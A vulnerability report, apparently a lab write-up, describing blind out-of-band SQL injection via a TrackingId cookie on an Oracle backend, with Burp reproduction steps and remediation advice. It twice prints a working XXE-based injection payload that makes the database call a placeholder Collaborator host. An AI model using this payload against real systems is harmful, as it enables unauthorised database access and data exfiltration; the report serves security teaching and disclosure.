# Blind SQL Injection in TrackingId Cookie allows Out-of-Band Server-Side Interaction

## 1. Executive Summary

A blind SQL injection vulnerability was identified in the `TrackingId` cookie of the application's front page. By injecting an Oracle SQL payload that performs an XML External Entity (XXE) operation, an attacker can force the database server to make an external request to an attacker-controlled Burp Collaborator domain, confirming out-of-band interaction even when the application provides no useful response data.

## 2. Vulnerability Details

- **Vulnerability Type:** Blind SQL Injection — Out-of-Band (OAST)
    
- **Target Endpoint/URL:** Shop front page `/`
    
- **Affected Parameter:** `TrackingId` cookie
    
- **Database:** Oracle
    
- **Authentication Level Required:** Unauthenticated
    

## 3. Steps to Reproduce (STR)

1. Visit the front page of the shop.
    
2. Open **Burp Suite** and navigate to **Proxy → HTTP history**.
    
3. Locate the request containing the `TrackingId` cookie.
    
4. Send the request to **Burp Repeater**.
    
5. Open the **Burp Collaborator client**.
    
6. Generate a unique Collaborator payload/domain.
    
7. In Burp Repeater, modify the `TrackingId` cookie using the following payload:
    

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

8. Replace `BURP-COLLABORATOR-SUBDOMAIN` with the unique domain generated by **Burp Collaborator**.
    
9. Alternatively, in Burp Suite, right-click at the indicated location and select **Insert Collaborator payload**.
    
10. Send the modified request.
    
11. Return to the **Burp Collaborator client**.
    
12. Poll for interactions.
    
13. If the database executes the injected SQL and processes the malicious XML, an interaction with the Collaborator server should be observed.
    
14. The interaction confirms that the application is vulnerable to an **out-of-band SQL injection**.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

The injected `TrackingId` cookie contains:

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

The important SQL components are:

```
UNION SELECT
EXTRACTVALUE(
    XMLTYPE('<XML payload containing external entity>'),
    '/l'
)
FROM dual
```

The XML payload defines an external entity:

```
<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">
%remote;
```

When the database processes the XML, the external entity causes the server to make an HTTP request to the supplied Collaborator domain.

**Expected result:**

```
Burp Collaborator
        ↓
External interaction detected
        ↓
Database/server processed the injected payload
```

The important evidence is **not necessarily the HTTP response from the vulnerable application**. Instead, the successful interaction observed in Burp Collaborator demonstrates that the backend performed the external network request.

## 5. Impact Analysis

### Technical Impact

The vulnerability allows an unauthenticated attacker to inject SQL into a backend Oracle database and trigger an external network interaction.

Unlike traditional SQL injection, an out-of-band SQL injection does not require the vulnerable application to return database results in its HTTP response. The attacker can instead use an external interaction channel to confirm SQL execution and potentially retrieve information.

Depending on the database configuration, network access, database privileges, and available Oracle functionality, an attacker may potentially use OOB techniques to:

- Confirm SQL injection.
    
- Exfiltrate sensitive database information through external requests.
    
- Identify internal or external network connectivity.
    
- Retrieve sensitive database values through DNS/HTTP-based channels.
    
- Conduct further attacks against accessible infrastructure.
    

### Business Impact

Successful exploitation could allow unauthorized access to sensitive database information without authentication. Depending on the privileges of the application's database account and network configuration, this could result in credential exposure, sensitive data leakage, further compromise of internal systems, and significant confidentiality impact.

## 6. Remediation & References

### Suggested Fix

1. Use **parameterized queries / prepared statements** for all database operations involving user-controlled data.
    
2. Never concatenate the `TrackingId` cookie directly into SQL statements.
    
3. Apply the **principle of least privilege** to the application's Oracle database account.
    
4. Disable or restrict unnecessary database functionality that permits external network interactions.
    
5. Restrict outbound network connectivity from database servers using firewall and egress filtering rules.
    
6. Disable unnecessary external entity processing and use secure XML parser configurations.
    
7. Monitor database servers for unexpected outbound DNS and HTTP requests.
    
8. Implement centralized logging and alerting for unusual database behavior and external interactions.
